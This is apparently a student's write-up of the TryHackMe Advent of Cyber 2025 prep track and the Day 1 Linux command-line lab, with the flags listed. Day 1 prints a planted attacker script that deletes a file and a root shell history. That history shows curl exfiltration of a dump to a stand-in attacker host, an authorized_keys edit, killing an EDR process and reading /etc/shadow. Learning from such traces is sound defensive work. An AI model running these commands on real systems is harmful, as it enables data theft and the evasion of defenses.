# ADVENT OF CYBER 2025 
---------------------------------------------------------------------------------------------------------------------------
## Day 0: Advent of Cyber Prep Track 
On this day, we were taught about how to use the TryHackMe platform and we were also taught the basics of the various things related to cybersecurity that we will be learning about.

### Challenge 1 - Password Pandemonium 
In this challenge, we simply needed to create a new password. It had to be atleast 12 characters long, must include a uppercase, lowercase alphabet with numbers, and special characters and it must not be in the breached database.
I set the password as `S0Cmas25@2025`. This gave me the flag as given below.

#### Flag 
`THM{StrongStart}`

### Challenge 2 - The Suspicious Chocolate.exe 
In this challenge, we had to analyze a file `chocolate.exe` and determine whether it is safe or or infected. I simply scanned it and saw that it came from a suspicious address and hence I marked it as infected to get the flag as below. 

#### Flag
`THM{NotSoSweet}`

### Challenge 3 - Welcome to the AttackBox
In this challenge, we were taught how to use the AttackBox to successfully complete the challenges that we needed to solve. I simply followed the steps as told to get the flag. 

#### Flag 
`THM{Ready2Hack}`

### Challenge 4 - The CMD Conundrum 
In this challenge, we were taught the absolute basics of the command prompt and had to get the flag onto the CMD. 

#### Flag 
`THM{WhereIsMcSkidy}`


### Challenge 5 - Linux Lore 
In this challenge, we were taught how to operate Linux using command line and then find the hidden message. 

#### Flag 
`THM{TrustNoBunny}`

### Challenge 6 - The Leak in the List
In this challenge we had to check whether the email address given to us was a part of any data breach or not. 

#### Flag 
`THM{LeakedAndFound}`

### Challenge 7 - WiFi Woes in Wareville
In this challenge, we had to change the default login credentials from the basic ones to new ones. Doing this gives us the flag. 

#### Flag 
`THM{NoMoreDefault}`

### Challenge 8 - The App Trap 
In this challenge, we had to look for apps that had unusual access permissions(password vault acccess) and disable it. 

#### Flag 
`THM{AppTrapped}`

### Challenge 9 - The Chatbot Confession 
In this challenge, we had to correct the AI chatbot to not reveal sensitive and private information when someone gives it a prompt. 

#### Flag 
`THM{DontFeedTheBot}`

### Challenge 10 - The Bunny's Browser Trail 
In this challenge, we had to go through the logs to find the suspicious entry. This gave us the flag. 

#### Flag 
`THM{EastmasIsComing}`

### What I learned
This served as a basic reminder of the broad divisions of cyber security and what is expected of us when we try to solve a challenge. 

### Notes
1. AI chatbot challenge comes under prompt engineering, which is a new field that is coming up. This is important and does not fall under the normal domains of cyber security.

### References
- N/A
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Day 1: Linux CLI - Shells Bells
On this day, we learned the basics of Linux Command Line Interface (CLI) via solving challenges following the walkrthroughs given alongside. 

### Solution 
- We first had to `cat` command to read the `README.txt` file which told us to look around for the guides. Using the `ls` command, I was able to see that there was a directory labelled `Guides`. I used the `cd` command to navigate to that directory. Now files can be hidden on the system if they start with `.`. I used the `ls -al` command to find out all the directories in the `/home/mcskidy/Guides` directory. The output is as below: 
```bash
mcskidy@tbfc-web01:~$ ls 
Desktop    Downloads  Music     Public      Templates  snap
Documents  Guides     Pictures  README.txt  Videos
mcskidy@tbfc-web01:~$ cat README.txt
For all TBFC members,
Yesterday I spotted yet another Eggsploit on our servers.
Not sure what it means yet, but Wareville is in danger.
To be prepared, I'll write the security guide by tomorrow.
As a precaution, I'll also hide the guide from plain view.
~ McSkidy
mcskidy@tbfc-web01:~$ cd Guides
mcskidy@tbfc-web01:~/Guides$ ls -al
total 12
drwxrwxr-x  2 mcskidy mcskidy 4096 Oct 29 20:46 .
drwxr-x--- 21 mcskidy mcskidy 4096 Nov 13 17:10 ..
-rw-rw-r--  1 mcskidy mcskidy  506 Oct 29 20:46 .guide.txt
mcskidy@tbfc-web01:~/Guides$ cat .guide.txt
I think King Malhare from HopSec Island is preparing for an attack.
Not sure what his goal is, but Eggsploits on our servers are not good.
Be ready to protect Christmas by following this Linux guide:

Check /var/log/ and grep inside, let the logs become your guide.
Look for eggs that want to hide, check their shells for what's inside!

P.S. Great job finding the guide. Your flag is:
-----------------------------------------------
THM{learning-linux-cli}
-----------------------------------------------
mcskidy@tbfc-web01:~/Guides$ 
```
- We got the first flag as above and the hint for the next flag in this challenge, where we were told by McSkidy to check the `/var/log` and `grep` to look for eggs that want to hide. So I navigated to the `/var/log` directory and used the command `grep "Failed Password" auth.log`. This gave me a lot of useless results. So I then read the challenge which told us that we need to find with names `egg` in `/home/socmas` directory. I then use the precrafted command `find /home/socmas -name *egg*`. This gave a shell script. On reading the shell script, I learned that the true wishlist of Christmas was deleted and it was replaced with a fake one. This also gave us our flag.
```bash
mcskidy@tbfc-web01:~/Guides$ find /home/socmas -name *egg* 
/home/socmas/2025/eggstrike.sh
mcskidy@tbfc-web01:~/Guides$ cat /home/socmas/2025/eggstrike.sh
# Eggstrike v0.3
# © 2025, Sir Carrotbane, HopSec
cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Chistmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"

# Your flag is:
# THM{sir-carrotbane-attacks}
mcskidy@tbfc-web01:~/Guides$
```
- For the final flag, we had to check the root history to figure out what flag was left behind by Sir Carrotbane in the root histroy. We had to check this by first switching to root user by doing `sudo su` and then reading the history left behind in the `/root/.bash_history` file.
```bash
mcskidy@tbfc-web01:~/Guides$ sudo su 
root@tbfc-web01:/home/mcskidy/Guides$ cd 
root@tbfc-web01:~$ less .bash_history
whoami
cd ~
ll 
nano .ssh/authorized_keys 
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
curl --data "THM{until-we-meet-again}" http://flag.hopsec.thm
pkill tbfcedr
cat /etc/shadow
cat /etc/hosts
exit
cd 
cd .bash_history
less .bash_history

```

### What I learned 
These were pretty simple challenges and the walk throughs made it even simpler. This basically served as a revision. 
### Notes
N/A
### References
N/A
